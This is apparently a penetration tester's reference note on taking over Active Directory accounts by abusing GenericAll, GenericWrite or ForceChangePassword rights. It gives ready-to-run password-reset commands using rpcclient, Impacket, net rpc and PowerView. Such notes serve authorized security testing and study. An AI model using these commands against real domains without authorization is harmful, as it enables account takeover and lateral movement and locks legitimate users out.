---
title: RPC
draft: false
tags:
  - windows
  - active-directory
  - lateral-movement
  - active
---
 
Useful when we dont have winrm privileges to access a machine. 

> [!Requirements]
> Valid AD credentials of a user with:
> - GenericAll or GenericWrite over the target user
> - Belongs to a group that has GenericAll or GenericWrite over the target user 

Access to the target:
```bash
$ rpcclient -U "AD_USER%PASSWORD" TARGET

or

$ rpcclient -U DOMAIN_FQDN/AD_USER TARGET
*enter password*
```

Change the password:
```bash
setuserinfo TARGET_USER 23 NEW_PASSWORD
```

If it dont work:
```
setuserinfo2 TARGET_USER 23 NEW_PASSWORD2
```

> [!Note]
> This is a classic abuse of a `ForceChangePassword` / `GenericAll` / `GenericWrite` ACL over a target user. Identify these ACL edges first — see [[AD ACL Enumeration and Abuse]] and [[AD Automatic Enumeration (BloodHound)]] (BloodHound highlights `ForceChangePassword` edges directly).

# Alternatives to change the password

- Using Impacket `changepasswd` (works remotely, supports several protocols):
```bash
$ impacket-changepasswd DOMAIN_FQDN/TARGET_USER@DC_IP -newpass NEW_PASSWORD -altuser AD_USER -altpass PASSWORD
```

- Using `net rpc` (from a Linux attack host):
```bash
$ net rpc password TARGET_USER NEW_PASSWORD -U DOMAIN_FQDN/AD_USER%PASSWORD -S DC_IP
```

- From Windows with PowerView (if we control the object):
```powershell
PS> $pass = ConvertTo-SecureString 'NEW_PASSWORD' -AsPlainText -Force
PS> Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $pass
```

> [!Important]
> Changing a user's password is destructive and noisy — the legitimate user loses access. In an engagement, note the original state and prefer targeted ACL abuse paths where possible.

# Related notes
- [[AD ACL Enumeration and Abuse]]
- [[AD Enumeration with PowerView]]
- [[WinRM]]
- [[Pass the Hash (PtH)]]